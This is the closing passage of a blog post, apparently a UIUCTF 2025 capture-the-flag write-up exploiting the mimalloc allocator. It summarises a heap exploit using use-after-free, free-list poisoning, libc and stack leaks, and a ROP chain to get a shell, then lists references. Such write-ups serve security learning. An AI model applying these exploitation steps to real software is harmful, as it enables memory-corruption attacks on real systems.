</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h2 class="heading-element" id="summary"><span>♘Summary</span>
  <a href="#summary" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Mimalloc allocates memory in 4 MiB segments split into 64 KiB pages, each page managing fixed-size chunks with three free lists (allocation, local, thread).</li>
<li>A heap leak is obtained by freeing a chunk and reading it back (since freed pointers aren’t nulled), revealing a heap address.</li>
<li>Allocations are always served from the <strong>allocation free list</strong> first. Once this list is empty, the allocator calls the <strong>slow path (<code>malloc_generic</code>)</strong>, which pulls chunks from the <strong>local free list</strong> (by merging it back).</li>
<li>Using UAF, we overwrite free list pointers (like tcache poisoning) and allocate a fake chunk inside the metadata region, which also holds libc pointers. Reading it gives both a libc leak and control over the free lists.</li>
<li>To pivot to the stack, we redirect the allocation free list to <code>libc.environ</code>, leak the stack pointer.</li>
<li>Finally, we set the allocation free list head to the return address, allocate a chunk, write our ROP chain there, and when <code>update</code> returns, execution jumps into our chain → shell.</li>
</ul>
<p><img loading="lazy" src='http://localhost:1313/d1ff/doremi/9444d9a9-7884-4519-a379-604e25d152cc.png' alt="image.png"></p>
<hr>
<h2 class="heading-element" id="resources--references"><span>Resources &amp; References</span>
  <a href="#resources--references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://2025.uiuc.tf/"target="_blank" rel="external nofollow noopener noreferrer">https://2025.uiuc.tf/</a> , <a href="https://sigpwny.com/"target="_blank" rel="external nofollow noopener noreferrer">https://sigpwny.com/</a></p>
<ul>
<li><a href="https://microsoft.github.io/mimalloc/"target="_blank" rel="external nofollow noopener noreferrer">https://microsoft.github.io/mimalloc/</a></li>
<li><a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2019/06/mimalloc-tr-v1.pdf"target="_blank" rel="external nofollow noopener noreferrer">https://www.microsoft.com/en-us/research/wp-content/uploads/2019/06/mimalloc-tr-v1.pdf</a></li>
<li><code>for setup</code> → <a href="https://ctftime.org/writeup/28214"target="_blank" rel="external nofollow noopener noreferrer">https://ctftime.org/writeup/28214</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2025-08-17 10:30:00">Updated on 2025-08-17&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="http://localhost:1313/d1ff/posts/uiu_writeup/doremi/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span><span><a href="vscode://file/C:%5cUsers%5citisa%5cmy-git%5cd1ff%5ccontent%5cposts%5cuiu_writeup%5cdoremi.md" title="Open in editor"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Open in editor</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="http://localhost:1313/d1ff/posts/uiu_writeup/doremi/" data-title="UIUCTF 2025 Writeup (Pwn/&#34;Do Re Mi&#34;)" data-via="Anuj1337" data-hashtags="Mimalloc,tcache_poisoning"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/d1ff/posts/uiu_writeup/doremi/" data-hashtag="Mimalloc"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/d1ff/posts/uiu_writeup/doremi/" data-title="UIUCTF 2025 Writeup (Pwn/&#34;Do Re Mi&#34;)"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="http://localhost:1313/d1ff/tags/mimalloc/" class="post-tag" title="Tags - Mimalloc">Mimalloc</a><a href="http://localhost:1313/d1ff/tags/tcache_poisoning/" class="post-tag" title="Tags - Tcache_poisoning">Tcache_poisoning</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="http://localhost:1313/d1ff/">Home</a></span>
    </section>
  </div><div class="post-nav"><a href="http://localhost:1313/d1ff/posts/smiley_writeup/limit/" class="post-nav-item" rel="prev" title="SmileyCTF 2025 Writeup (Pwn/Limit)"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>SmileyCTF 2025 Writeup (Pwn/Limit)</a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--progress-h: 3px;--bg-progress: #FFA500;--bg-progress-dark: #00FFFF;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="http://localhost:1313/d1ff/lib/cookieconsent/cookieconsent.min.css"><script src="http://localhost:1313/d1ff/lib/sharer/sharer.min.js" async defer></script><script src="http://localhost:1313/d1ff/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"version":"v0.3.21-b2e6f70a"};console.log('Page config:', window.config);</script><script src="http://localhost:1313/d1ff/js/theme.min.js" defer></script></body>
</html>
